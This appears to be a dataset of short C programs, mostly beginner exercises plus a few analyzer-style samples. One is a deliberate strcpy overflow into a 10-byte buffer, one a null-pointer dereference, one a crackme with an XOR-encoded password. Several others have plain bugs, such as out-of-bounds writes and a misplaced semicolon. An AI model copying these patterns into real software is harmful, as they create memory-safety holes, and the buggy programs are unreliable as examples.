    "#include <stdio.h>\nchar lower(char c);\nint main() {\n  char testString[] = { 'H', 'E', 'Y' };\n  int i;\n  i = 0;\n  while (testString[i] != 3) {\n    printf(\"%c Converted to lower case is: %c\\n\", testString[i], lower(testString[i]));\n    printf(\"ASCII IDENTIFIER: %d\\n\", testString[i]);\n    ++i;\n  }\n  return 0;\n}\nchar lower(char c) {\n  return c >= 'A' && c <= 'Z' ? c + 32 : c;\n}",
    "#include <stdio.h>\n\n\nint is_balanced(char []);\nint main(int argc, char * argv[]) {\n    printf(\"%d\\n\", is_balanced(\"((())(())())()\"));\n    printf(\"%d\\n\", is_balanced(\"((())(())()\"));\n    printf(\"%d\\n\", is_balanced(\")))\"));\n    return 0;\n}\nint is_balanced(char str[]) {\n    int i, sum, balanced;\n    sum = 0;\n    balanced = 1;\n    for(i=0; str[i]!='\\0' && balanced; i++) {\n        if(str[i] == '(') {\n            sum++;\n        } else if(str[i] == ')') {\n            sum--;\n        }\n        balanced = sum>=0;\n    }\n    balanced = (sum==0);\n    return balanced;\n}",
    "#include <stdio.h>\nstatic double d;\nint main(void)\n{\n  printf (\"+++Double size:\\n\");\n  printf (\"%d\\n\", sizeof (d));\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdbool.h>\n#include <stdint.h>\n\ntypedef int32_t i32;\ni32 axor(int a,int b){\n i32 res = 0;\n for(i32 i = 31; i >= 0; i--){\n  _Bool b1 = a & ( 1 << i );\n  _Bool b2 = b & ( 1 << i );\n  _Bool xbit = (b1 & b2) ? 0 : (b1 | b2);\n  res <<= 1;\n  res |= xbit;\n }\n return res;\n}\nint main(void){\n char *flag = \"\\x53\\x4e\\x4e\\x55\\x44\\x53\\x52\\x5a\\x59\\x11\\x53\\x7e\\x44\\x15\\x59\\x7e\\x44\\x15\\x59\\x5c\\x42\\x55\\x47\";\n char key[40];\n printf(\"enter the password:> \");\n scanf(\"%40s\",key);\n int m = 0;\n for (int i=0; i<23; i++){\n  m |= axor(\n   axor(key[i],0x21),\n   flag[i]\n  );\n }\n if(m==0){\n  puts(\"Correct password!\");\n }else{\n  puts(\"Wrong password\");\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\n_Bool fix_palette_file(char *path)\n{\n unsigned short buffer[4];\n FILE *stream = fopen(path, \"rb\");\n if (!stream)\n  return perror(path), 0;\n fread(buffer, sizeof(*buffer), sizeof(buffer) / sizeof(*buffer), stream);\n fclose(stream);\n stream = fopen(path, \"wb\");\n if (!stream)\n  return perror(path), 0;\n fwrite(buffer, sizeof(*buffer), 1, stream);\n fwrite(&buffer[2], sizeof(*buffer), 2, stream);\n fwrite(&buffer[1], sizeof(*buffer), 1, stream);\n fclose(stream);\n return 1;\n}\nint main(int argc, char **argv)\n{\n for (int i = 1; i < argc; i++)\n  if (!fix_palette_file(argv[i]))\n   return 1;\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char *argv[])\n{\n  if (argc != 2) {\n    printf(\"Usage : argv[0] [ch#]\\n\");\n    return 1;\n  }\n  FILE *fp = fopen(\"yaml/RegisterValue.yml\",\"r\");\n  if (!fp) {\n    fprintf((stderr), \"cannot open RegisterValue.yml\\n\");\n    return 1;\n  }\n  int chNext = atoi(argv[1]);\n  if (!(chNext>=0 && chNext<=63)) {\n    fprintf((stderr), \"channel should be 0<=ch<=63\\n\");\n    return 1;\n  }\n  FILE *fp2 = fopen(\"yaml/RegisterValue_new.yml\",\"w\");\n  if (!fp2) {\n    fprintf((stderr), \"cannot open RegisterValue_new.yml\\n\");\n    return 1;\n  }\n  char buf[100];\n  int ch;\n  while (1) {\n    if (fgets(buf, sizeof(buf), fp) == ((void*)0))\n      break;\n    if (sscanf(buf, \"High Gain Channel: %d\", &ch) == 1) {\n      fprintf(fp2, \"High Gain Channel: %d\\n\", chNext);\n    } else {\n      fprintf(fp2, \"%s\", buf);\n    }\n  }\n  fclose(fp);\n  fclose(fp2);\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nvoid func(int *ptr, int x) {\n    for (int i = 0; i < x; i++) {\n        printf(\"Digite o valor %d do vetor\\n\", i + 1);\n        scanf(\"%d\", &ptr[i]);\n    }\n}\nint main () {\n int x;\n printf(\"Digite o numero de elementos que deseja\\n\");\n scanf(\"%i\", &x);\n int *ptr = malloc(x * sizeof(int));\n func(ptr, x);\n    for (int i = 0; i < x; i++) {\n        printf (\"%d\\n\", ptr[i]);\n    }\n    free(ptr);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main() {\n int x;\n scanf(\"%d\",&x);\n printf(\"%d\",x);\n return 0;\n}",
    "#include<stdio.h>\n\ndouble f(double x)\n{\n    return (x*x)+1;\n}\nint main()\n{\n    double a,b,h;\n    printf(\"enter range of integration [a,b] as a b\\n\");\n    scanf(\"%lf %lf\",&a,&b);\n    h=(b-a)/1000;\n    double sum_terms=0;\n    for(int i=1;i<1000;i++)\n    {\n        sum_terms+=f(a+i*h);\n    }\n    double result=h*((f(a)+f(b))/2 +sum_terms);\n    printf(\"OUTPUT is %lf\",result);\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, const char * argv[]) {\n    unsigned width, precision;\n    int number = 256;\n    double weight = 242.5;\n    printf(\"What field width?\\n\");\n    scanf(\"%d\", &width);\n    printf(\"The number is: %*d: \\n\", width, number);\n    printf(\"Now enter a width and a precision: \\n\");\n    scanf(\"%d %d\", &width, &precision);\n    printf(\"Weight = %*.*f\\n\", width, precision, weight);\n    return 0;\n}",
    "#include<stdio.h>\nint main(){\n int n,i,o[6],a;\n for(scanf(\"%d\",&n);n;n--){\n  scanf(\"%d\",&a);\n  for(i=0;a;i++){\n   o[i]=a%8;\n   a/=8;\n  }\n  for(;i;i--)\n   printf(\"%d\",o[i-1]);\n  printf(\"\\n\");\n }\n return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n    int year, rem_4, rem_100, rem_400;\n    printf ( \"Enter the year: \");\n    scanf (\"%i\", &year);\n    rem_4 = year % 4;\n    rem_100 = year % 100;\n    rem_400 = year % 400;\n    if ( ( rem_4 == 0 && rem_100 != 0 ) || rem_400 == 0 )\n      printf ( \"It's a leap year.\\n\");\n    else\n      printf ( \"Nope, it's not a leap year.\\n\");\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n long long m,n,i,j,k,a,b,c;\n scanf(\"%lld%lld\",&m,&n);\n a=1;b=1;c=1;\n if(n==0){printf(\"0\");}\n else if(m==0||m<=n) printf(\"1\");\n else{\n  for(i=1;i<=m-n;i++)\n   a*=i;\n  for(j=1;j<=n;j++)\n   b*=j;\n  for(k=1;k<=m;k++)\n   c*=k;\n  printf(\"%lld\",c/a/b);}\n return 0;\n}",
    "#include <stdio.h>\nint main(\n  int argc,\n  char **argv)\n{\nint *px= ((void*)0);\nint i = 0;\n++i;\n++i;\nprintf(\"x=%d\\n\",*px);\n++i;\nreturn 0;\n}",
    "#include <stdio.h>\nvoid copy(int * array1, int * array2, int * target, int n);\nvoid twin(int array[][5], int cols);\nvoid showArray(int array[][5], int cols);\nint main(void)\n{\n    int array[4] = {445,78,78, 5};\n    int arrat1[4] = {5345, 45, 45, 4};\n    int array2[4] = {0};\n    int array3[3][5] = {\n        {16, 2, 77, 40, 12071},\n        {787, 78, 87, 7, 9},\n        {478, 787, 8, 78, 78}\n    };\n    copy( array, arrat1, array2, 4);\n    for (int i = 0; i < 4; i++)\n        printf(\"%d \", array2[i]);\n    printf(\"\\n\");\n    showArray(array3, 3);\n    twin(array3, 3);\n    showArray(array3, 3);\n    return 0;\n}\nvoid copy(int * array1, int * array2, int * target, int n)\n{\n    for (int i = 0; i < n; i++)\n        target[i] = *(array1 + i) + *(array2 + i);\n}\nvoid twin(int array[][5], int cols)\n{\n    for (int i = 0; i < cols; i++)\n        for (int j = 0; j < 5; j++)\n            array[i][j] *= 2;\n}\nvoid showArray(int array[][5], int cols)\n{\n    for (int j = 0; j < cols; j++)\n    {\n        for (int i = 0; i < 5;i++)\n            printf(\"%d \", array[j][i]);\n        printf(\"\\n\");\n    }\n}",
    "#include <stdio.h>\nvoid array_value(int t[],int n){\n    for(int i=0;i<n;i++){\n        scanf(\"%d\",&t[i]);\n    }\n}\nint main(){\n int n,m;\n scanf(\"%d\",&n);\n int A[n];\n array_value(A,n);\n scanf(\"%d\",&m);\n int B[m],C[m+n];\n    array_value(B,m);\n    for(int i=0;i<(m+n);i++){\n        if(i<n)\n            C[i]=A[i];\n        else\n            C[i]=B[i-n];\n    }\n    for(int i=0;i<(m+n);i++){\n        for(int j=i+1;j<(m+n);j++){\n            if(C[i]>C[j]){\n                int swap=C[i];\n                C[i]=C[j];\n                C[j]=swap;\n            }\n        }\n    }\n    for(int i=0;i<(m+n);i++)\n        printf(\"%d/n\",C[i]);\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n  int i;\n  for (i = 2; i <= 50; i += 2)\n    printf(\"%d\\t\", i);\n}",
    "#include<stdio.h>\nvoid quick_sort(int arr[], int low, int high);\nint main()\n{\n    int n, arr[100], i;\n    printf(\"Enter number of elements in array: \");\n    scanf(\"%d\", &n);\n    printf(\"Enter array elements: \\n\");\n    for(i = 0; i < n; i++){\n        scanf(\"%d\", &arr[i]);\n    }\n    quick_sort(arr, 0, n);\n    printf(\"Sorted array elements: \\n\");\n    for(i = 0; i < n; i++){\n        printf(\"%d \", arr[i]);\n    }\n    printf(\"\\n\");\n}\nvoid quick_sort(int arr[], int low, int high)\n{\n    int pivot, i, j, temp;\n    if (low < high)\n    {\n        pivot = low;\n        i = low;\n        j = high;\n        while (i < j)\n        {\n            while (arr[i] <= arr[pivot] && i <= high)\n            {\n                i++;\n            }\n            while (arr[j] > arr[pivot] && j >= low)\n            {\n                j--;\n            }\n            if (i < j)\n            {\n                temp = arr[i];\n                arr[i] = arr[j];\n                arr[j] = temp;\n            }\n        }\n        temp = arr[j];\n        arr[j] = arr[pivot];\n        arr[pivot] = temp;\n        quick_sort(arr, low, j - 1);\n        quick_sort(arr, j + 1, high);\n    }\n}",
    "#include <stdio.h>\nfloat maggiore(float a, float b);\nint main(){\n float a,b,c;\n float magg;\n scanf(\"%f %f %f\", &a, &b, &c);\n magg = maggiore(maggiore(a,b), c);\n printf(\"%f\", magg);\n return 0;\n}\nfloat maggiore(float a, float b){\n float m;\n if(a>b)\n  m = a;\n else\n  m = b;\n return m;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <ctype.h>\n\nint get_line(char line[], int lim);\nint htoi(char hex[]);\nint main(void)\n{\n  char hex[100];\n  get_line(hex, 100);\n  printf(\"%d\", htoi(hex));\n  return 0;\n}\nint get_line(char line[], int lim)\n{\n  char c;\n  int i = 0;\n  while (i < lim - 1 && (c = getchar()) != (-1) && c != '\\n')\n  {\n    line[i++] = c;\n  }\n  line[i] = '\\0';\n  return i;\n}\nint htoi(char hex[])\n{\n  int result = 0;\n  int i = 0, len = strlen(hex);\n  while (i < len)\n  {\n    if (hex[i] == '0' && (hex[i + 1] == 'x' || hex[i + 1] == 'X'))\n    {\n      i += 2;\n    }\n    int temp = tolower(hex[i]);\n    if ((0 ? isdigit(temp) : ((unsigned)(temp)-'0') < 10))\n    {\n      temp -= 48;\n    }\n    if ((0 ? isalpha(temp) : (((unsigned)(temp)|32)-'a') < 26) && temp <= 'f')\n    {\n      temp = temp - 'a' + 10;\n    }\n    if ((hex[i] >= '0' && hex[i] <= '9') || (hex[i] >= 'a' && hex[i] <= 'f') || (hex[i] >= 'A' && hex[i] <= 'F'))\n    {\n      result += temp * (int)pow(16, len - i - 1);\n    }\n    else\n    {\n      printf(\"Error: Not a valid hex value.\\n Try this format: 0xHHHH, where H is a hex digit.\\n\");\n    }\n    ++i;\n  }\n  return result;\n}",
    "#include <stdio.h>\n#include <pthread.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <string.h>\nint calc_prime(int a){\n  for(int i = a - 1; i >= 2; i--){\n    if(a % i == 0) return 0;\n  }\n  return 1;\n}\nvoid * calc(void * a){\n  int64_t n = (int64_t)a;\n  printf(\"Prime calculation started for N=%ld\\n\", n);\n  ssize_t count = 0;\n  for(int i = 2; i < n; i++){\n    if(calc_prime(i)){\n      count++;\n    }\n  }\n  printf(\"Number of primes for N=%ld is %ld\\n\", n, count);\n  pthread_exit(0);\n}\nint main(){\n  char a;\n  char *line = ((void*)0);\n  size_t len = 0;\n  ssize_t nread;\n  int counter = 0;\n  pthread_t threads[100];\n  while((nread = getline(&line, &len, (stdin))) != -1){\n    line[strlen(line) - 1] = '\\0';\n    if(strcmp(line, \"e\") == 0){\n      break;\n    } else if(line[0] == 'p'){\n      int number;\n      sscanf(line + 2, \"%d\", &number);\n      int rc = pthread_create(&threads[counter++], ((void*)0), &calc, (void*)((int64_t)number));\n      if(rc){\n          printf(\"Err for pthread create\\n\");\n      }\n    } else {\n      printf(\"Supported commands:\\np N - Starts a new calculation for the number of primes from 1 to N\\ne - Waits for all calculations to finish and exits\\n\");\n    }\n  }\n  free(line);\n  pthread_exit(0);\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n#include<string.h>\nstatic int sep_path_array(const char *path, char **arpath) {\n    int cnt = 0;\n    char *str = ((void*)0);\n    char *p1, *p2;\n    if (path[strlen(path) - 1] != '/') {\n        str = malloc(strlen(path) + 1 + 1);\n        memcpy(str, path, strlen(path));\n        str[strlen(path)] = '/';\n        str[strlen(path) + 1] = '\\0';\n        p2 = str;\n    } else {\n        p2 = (char *)path;\n    }\n    while (1) {\n        p1 = strchr(p2, '/');\n        if (p1) {\n            if (cnt) {\n                arpath[cnt] = malloc(p1 - p2 + 1);\n                memset(arpath[cnt], 0, p1 - p2 + 1);\n                memcpy(arpath[cnt], p2, p1 - p2);\n                cnt++;\n            }\n            p1++;\n        } else {\n            break;\n        }\n        p2 = strchr(p1, '/');\n        if (p2) {\n            arpath[cnt] = malloc(p2 - p1 + 1);\n            memset(arpath[cnt], 0, p2 - p1 + 1);\n            memcpy(arpath[cnt], p1, p2 - p1);\n            cnt++;\n            p2++;\n        } else {\n            break;\n        }\n    }\n    free(str);\n    return cnt;\n}\nstatic char *calc_relative_path(const char *patha, const char *pathb) {\n    char *ret = ((void*)0);\n    char *arpatha[256];\n    int patha_num = sep_path_array(patha, arpatha);\n    char *arpathb[256];\n    int pathb_num = sep_path_array(pathb, arpathb);\n    int i, j, k = 0;\n    j = (patha_num > pathb_num) ? pathb_num : patha_num;\n    for (i = 0; i < j; i++) {\n        if (!k && !strcmp(arpatha[i], arpathb[i])) {\n            k = 1;\n        } else if (k && strcmp(arpatha[i], arpathb[i])) {\n            k = 1;\n            i--;\n            break;\n        }\n    }\n    ret = malloc(256);\n    memset(ret, 0, 256);\n    if (k) {\n        if (i == j)\n            i--;\n        strcat(ret, \"./\");\n        for (k = 0; k < (patha_num - (i + 1)); k++) {\n            strcat(ret, \"../\");\n        }\n        for (k = i + 1; k < pathb_num; k++) {\n            strcat(ret, arpathb[k]);\n            strcat(ret, \"/\");\n        }\n    } else {\n        for (k = 0; k < patha_num; k++) {\n            strcat(ret, \"../\");\n        }\n        for (k = 0; k < pathb_num; k++) {\n            strcat(ret, arpathb[k]);\n            strcat(ret, \"/\");\n        }\n    }\n    ret[strlen(ret) - 1] = 0;\n    for (i = 0; i < patha_num; i++) {\n        free(arpatha[i]);\n    }\n    for (j = 0; j < pathb_num; j++) {\n        free(arpathb[j]);\n    }\n    return ret;\n}\nint main(int argc, char **argv) {\n    if (argc != 3)\n        return -1;\n    char *r = calc_relative_path(argv[1], argv[2]);\n    printf(\"%s\\n\", r);\n    free(r);\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nfloat Delta(float a, float b, float c){\n    return b*b - 4*a*c;\n}\nfloat RaizX1(float a, float b, float delta){\n    return (-b + sqrt(delta)) / (2*a);\n}\nfloat RaizX2(float a, float b, float delta){\n    return (-b - sqrt(delta)) / (2*a);\n}\nint main(){\n    float a, b, c;\n    float delta;\n    scanf(\"%f %f %f\", &a, &b, &c);\n    delta = Delta(a, b, c);\n    if (delta < 0 || a == 0){\n        puts(\"Impossivel calcular\");\n    }\n    else {\n        printf(\"R1 = %.5f\\n\", RaizX1(a, b, delta));\n        printf(\"R2 = %.5f\\n\", RaizX2(a, b, delta));\n    }\n    return 0;\n}",
    "#include<stdio.h>\n#include<math.h>\nint C(int m,int n)\n{\n    if(n==0||m==n)\n        return (1);\n    else if(n==1)\n        return (m);\n    else return(C(m-1,n-1)+C(m-1,n));\n}\nint main()\n{\n    int m,n;\n    scanf(\"%d%d\",&m,&n);\n    printf(\"%d\",C(m,n));\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int sum = 0;\n    int n = 0;\n    for (scanf(\"%d\", &n); n > 0; --n) {\n        int elem = 0;\n        scanf(\"%d\", &elem);\n        sum += elem;\n    }\n    printf(\"%d\\n\", sum);\n}",
    "#include <stdio.h>\nint main()\n{\n    int number = 0;\n    printf(\"Digite um valor inteiro de 0 a 9: \\n\");\n    scanf(\"%d\", &number);\n    switch (number)\n    {\n        case 0:\n            printf(\"Foi digitado o numero Zero(%d)! \\n\", number);\n        break;\n        case 1:\n            printf(\"Foi digitado o numero Um(%d)! \\n\", number);\n        break;\n        case 2:\n            printf(\"Foi digitado o numero Dois(%d)! \\n\", number);\n        break;\n        case 3:\n            printf(\"Foi digitado o numero Tres(%d)! \\n\", number);\n        break;\n        case 4:\n        printf(\"Foi digitado o numero Quatro(%d)! \\n\", number);\n        break;\n        case 5:\n        printf(\"Foi digitado o numero Cinco(%d)! \\n\", number);\n        break;\n        case 6:\n        printf(\"Foi digitado o numero Seis(%d)! \\n\", number);\n        break;\n        case 7:\n        printf(\"Foi digitado o numero Sete(%d)! \\n\", number);\n        break;\n        case 8:\n        printf(\"Foi digitado o numero Oito(%d)! \\n\", number);\n        break;\n        case 9:\n        printf(\"Foi digitado o numero Nove(%d)! \\n\", number);\n        break;\n        default:\n        printf(\"Foi digitado um numero invalid(fora da escala 0-9)! \\n\");\n        break;\n    }\n    return 0;\n}",
    "#include <stdio.h>\n\nvoid print_array(int[], int);\nint array_elements_size(int[], int);\nvoid array_elements(int[], int);\nint main()\n{\n    int num_val;\n    int array_num[9] = {};\n    int new_size = 0;\n    puts(\"Enter 10 numbers between 1 and 20 inclusively\");\n    for(int i = 0; i<10; i++)\n    {\n        scanf(\"%d\", &num_val);\n        while(num_val < 1 || num_val > 20)\n        {\n            scanf(\"%d\", &num_val);\n        }\n        array_num[i] = num_val;\n    }\n    new_size = array_elements_size( array_num, 10);\n    array_elements(array_num, new_size);\n    printf(\"%d\\n\", new_size);\n    return 0;\n}\nvoid print_array(int array[], int size)\n{\n    printf(\"%c\", '[');\n    for(int i=0; i< size; i++)\n    {\n        printf(\" %d \", array[i]);\n        if(i != size - 1)\n        {\n            printf(\"%c\", '|');\n        }\n    }\n    printf(\"%c\\n\", ']');\n}\nint array_elements_size(int array[], int size)\n{\n    int new_size = 0;\n    int elements[21]= {};\n    for(int i=0; i<size; i++)\n    {\n        ++elements[array[i]];\n    }\n    for(int i=1; i<21; i++)\n    {\n        if(elements[i] > 0)\n        {\n            ++new_size;\n        }\n    }\n    return new_size;\n}\nvoid array_elements(int array[], int size)\n{\n    int elements[21]= {};\n    int new_array[size - 1];\n    int num = 0;\n    for(int i=0; i<10; i++)\n    {\n        if(array[i] != 0)\n        {\n            ++elements[array[i]];\n        }\n    }\n    for(int i=0; i<10; i++)\n    {\n        if(elements[array[i]] > 0)\n        {\n            new_array[num] = array[i];\n            elements[array[i]] = 0;\n            num++;\n        }\n    }\n    print_array(new_array,size);\n}",
    "#include <stdio.h>\nint main()\n{\n  int n, contador = 0;\n  scanf(\"%d\", &n);\n  n *= 2;\n  while (contador < n)\n  {\n    printf(\"Eu adora programar\\n\");\n    contador ++;\n  }\n  return(0);\n}",
    "\n\n   int variable_we_expect_to_see;\n\n\n\nvoid foo()\n   {\n     int x = 42;\n   }\nint main()\n   {\n   }\nint x = 42;\nint y = 42;",
    "#include<stdio.h>\nint main() {\n    FILE *f = fopen(\"3statements.dot\", \"w\");\n fprintf(f, \"Digraph G{\\n\");\n    int n_const = 0;\n    int ne = 0;\n    int n_op = 0;\n    int n_a = 0;\n    int n_b = 0;\n    int n_c = 0;\n fprintf(f, \"const%d [label=10, att1=const];\\n\", n_const);\n fprintf(f, \"a_%d [label=a, att1=var, att2=loc, att3=int ];\\n\", ++n_a);\n ne++;\n fprintf(f, \"const%d->a_%d [label=%d, ord=%d];\\n\", n_const, n_a, ne, ne);\n    int a = 10;\n    n_const++;\n    fprintf(f, \"const%d [label=5, att1=const];\\n\", n_const);\n fprintf(f, \"b_%d [label=b, att1=var, att2=loc, att3=int ];\\n\", ++n_b);\n    n_op++;\n fprintf(f, \"op%d [label=\\\"*\\\", att1=op ];\\n\", n_op);\n ne++;\n fprintf(f, \"const%d->op%d [label=%d, ord=%d, pos=l];\\n\", n_const, n_op, ne, ne);\n ne++;\n    fprintf(f, \"a_%d->op%d [label=%d, ord=%d, pos=r];\\n\", n_a, n_op, ne, ne);\n    ne++;\n    fprintf(f, \"op%d->b_%d [label=%d, ord=%d];\\n\", n_op, n_b, ne, ne);\n    int b = 5 * a;\n    fprintf(f, \"c_%d [label=c, att1=var, att2=loc, att3=int ];\\n\", ++n_c);\n    n_op++;\n fprintf(f, \"op%d [label=\\\"*\\\", att1=op ];\\n\", n_op);\n ne++;\n fprintf(f, \"b_%d->op%d [label=%d, ord=%d, pos=l];\\n\", n_b, n_op, ne, ne);\n ne++;\n    fprintf(f, \"a_%d->op%d [label=%d, ord=%d, pos=r];\\n\", n_a, n_op, ne, ne);\n    ne++;\n    fprintf(f, \"op%d->c_%d [label=%d, ord=%d];\\n\", n_op, n_b, ne, ne);\n    int c = b * a;\n    fprintf(f, \"}\");\n fclose(f);\n    return c;\n}",
    "#include <stdio.h>\nint inverseNumber(int);\nint digitNumber(int);\nint power(int,int);\nint main(void)\n{\n    int num = 12345;\n    printf(\"%d -- inverse : %d\\n\",num,inverseNumber(num));\n    return 0;\n}\nint inverseNumber(int num)\n{\n    int digit=0;\n    if(num == 0)\n        return 0;\n    else\n        digit = digitNumber(num);\n    return (num%10)*power(10,digit-1) + inverseNumber(num/10);\n}\nint digitNumber(int num)\n{\n    int digit = 0;\n    for(; num ; num /= 10 , ++digit);\n    return digit;\n}\nint power(int base, int exponential)\n{\n    int res = 1;\n    for(int i=0 ; i < exponential ; ++i , res *= base);\n    return res;\n}",
    "#include <stdio.h>\nvoid bubble_sort(int *idx, int n_idx, int *buf)\n{\n        int i, j, tmp;\n\n\n        for (i = 0; i < n_idx; i++) for (j = i + 1; j < n_idx; j++) { if (idx[j] < idx[i]) { tmp = idx[j]; idx[j] = idx[i]; idx[i] = tmp;}; }\n        for (i = 0; i < n_idx; i++) for (j = i + 1; j < n_idx; j++) { if (buf[idx[j]] < buf[idx[i]]) { tmp = buf[idx[j]]; buf[idx[j]] = buf[idx[i]]; buf[idx[i]] = tmp;};}\n\n\n}\nint main()\n{\n        int values[] = {7, 6, 5, 4, 3, 2, 1, 0};\n        int idx[] = {6, 1, 7};\n        int i;\n        printf(\"before sort:\\n\");\n        for (i = 0; i < 8; i++)\n                printf(\"%d \", values[i]);\n        printf(\"\\n\\nafter sort:\\n\");\n        bubble_sort(idx, 3, values);\n        for (i = 0; i < 8; i++)\n                printf(\"%d \", values[i]);\n        printf(\"\\n\");\n        return 0;\n}",
    "#include <stdio.h>\n#include <ctype.h>\nint main(void)\n{\n char ch;\n int sum = 0;\n printf(\"Enter a sentence:\");\n for (;;) {\n  ch = getchar();\n  ch = tolower(ch);\n  if (ch == 'a' || ch == 'o' || ch == 'e' || ch == 'i' || ch == 'u')\n   sum++;\n  if (ch == '\\n')\n   break;\n }\n printf(\"Your sentence contains %d vowels.\", sum);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int n;\n    scanf(\"%d\",&n);\n    int a[n];\n    for(int i=0;i<n;i++){\n        scanf(\"%d\",a+i);\n    }\n    int freq[100000]={0};\n    for(int i=0;i<n;i++){\n        freq[a[i]]++;\n    }\n    printf(\"Repeated elements are: \\n\");\n    for(int i=0;i<100000;i++){\n        if(freq[i]>1) printf(\"%d\\n\",a[i]);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\nint max(int m,int n){\n if(m>=n)return m;\n else return n;}\nint min(int m,int n){\n if(m>=n)return n;\n else return m;}\nint main() {\n int n,K,l,r,i,j,N,M,S,L,H;\n scanf(\"%d%d\",&n,&K);\n int a[n];\n for(i=0;i<=n-1;i++){scanf(\"%d\",&a[i]);}\n while(~scanf(\"%d%d\",&l,&r)){\n  for(j=l,M=1;j<=r;j++){\n   M*=a[j];M=M%n;\n  }\n  for(j=l,N=0;j<=r;j++){\n   N+=a[j];N=N%n;\n  }\n  S=min(N,M);L=max(N,M);\n  for(j=S,H=0;j<=L;j++){\n   H=H^a[j];\n  }\n  printf(\"%d\\n\",H);\n }\n return 0;\n}",
    "#include <stdio.h>\ndouble cube(double num);\nint main() {\n    double num;\n    scanf(\"%lf\", &num);\n    printf(\"the cube of %lf is %lf.\\n\", num, cube(num));\n}\ndouble cube(double num) {\n    return num * num * num;\n}",
    "#include<stdio.h>\nint main()\n{\n    int i=0, x=0;\n    do{\n        if(i%10==0){\n            x++;\n            printf(\"%d \",x);\n        }++i;\n    }while(i<50);\n    printf(\"\\n x= %d\", x);\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n float N1, N2, N3, media=0;\n scanf(\"%f\", &N1);\n scanf(\"%f\", &N2);\n scanf(\"%f\", &N3);\n media = ((N1 + N2 + (N3 * 2)));\n media = media / (N1+N2+N3);\n printf(\"%f\\n\", media);\n if (media > 60){\n  printf(\"Voc\u00ea foi aprovado\\n\");\n }else{\n  printf(\"Voc\u00ea n\u00e3o foi aprovado\\n\");\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdbool.h>\n_Bool arr[10];\nint main()\n{\n int bits, input, output;\n printf(\"Number of bits: \");\n scanf(\"%d\", &bits);\n printf(\"input: \");\n scanf(\"%d\", &input);\n printf(\"output: \");\n scanf(\"%d\", &output);\n int res = input^output;\n int idx = 0;\n while(res) {\n  arr[idx++] = res % 2;\n  res /= 2;\n }\n for (int i = bits - 1; i >= 0; i--) {\n  if (!arr[i]) {\n   printf(\"direct \");\n  } else {\n   printf(\"invers \");\n  }\n }\n printf(\"\\n\");\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint func()\n{ char in[]=\"kkkkskkkkkkk\";\n char buf[10];\n strcpy(buf, in);\n return 0;\n}\nint main()\n{\n char *in = \"myinput\";\n int ret;\n ret = func();\n return 0;\n}",
    "#include <stdio.h>\nint main() {\n int temps[5];\n int media;\n int soma=0;\n int i=0;\n while (i<5) {\n  printf(\"Digite a temperatura: \");\n  scanf(\"%d\",&temps[i]);\n  if (temps[i]>=-100 && temps[i]<=100) {\n   soma=soma+temps[i];\n   i++;\n  }\n  else {\n   printf(\"A temperatura deve estar entre -100 e 100\\n\");\n  }\n }\n media=soma/5;\n for (i=0; i<5; i++) {\n  if (temps[i]>=media) {\n   printf(\"Temperaturas acima da media: %d\\n\",temps[i]);\n  }\n }\n printf(\"Media da temperatura: %d\\n\",media);\n printf(\"Total da temparatura: %d\\n\",soma);\nreturn 0;\n}",
    "#include <stdio.h>\nint main(int argc, char* argv[])\n{\n    for(int i = 1; i < 20; ++i)\n    {\n        if (i == 13) continue;\n        if (i%7 == 0) continue;\n        printf(\"Number i = %d. \", i);\n        if (i%3 == 0)\n            printf(\"It is a multiple of 3!\\n\", i);\n        else\n            printf(\"It's not a multiple of 3...\\n\", i);\n    }\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\nint a[]={1,3,4,2,6},f[10]={0},i,j;\nint n=sizeof(a)/sizeof(int);\nint b[n];\nfor(i=0; i<=n-1; i++);\n{\n    int x = a[i];\n    f[x]++;\n}\nprintf(\"\\n\");\nfor(i=1; i<=9; i++)\n{\n    f[i]=f[i]+f[i-1];\n}\nprintf(\"\\n\");\nprintf(\"\\n\");\nfor(i=n-1; i>=0; i--)\n{\n    int x=a[i];\n    int pos=f[x];\n    b[pos-1]=x;\n    f[x]--;\n    {\n        printf(\"\\n\");\n        for(i=0; i<=n-1; i++)\n        printf(\"%d,\",b[i]);\n    }\n}\nreturn 0;\n}",
    "int main() {\n  int i = 0;\n  int k = 0;\n  while (i <= 10) {\n    while (k <= 5) {\n      k++;\n    }\n    i++;\n  }\n  return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    puts(\"oonf_api package compiled!\");\n    return 0;\n}",
    "#include <stdio.h>\nfloat CalculaMedia(int Num1, int Num2){\nfloat Media;\nMedia=(float)(Num1+Num2)/2;\nreturn Media;\n}\nint main(){\nint Numero1, Numero2;\nfloat M;\nprintf(\"Digite dois numeros inteiros: \");\nscanf(\"%d%d\", &Numero1, &Numero2);\nM=CalculaMedia(Numero1, Numero2);\nprintf(\"\\nA media eh: %2f\", M);\nreturn 0;\n}",
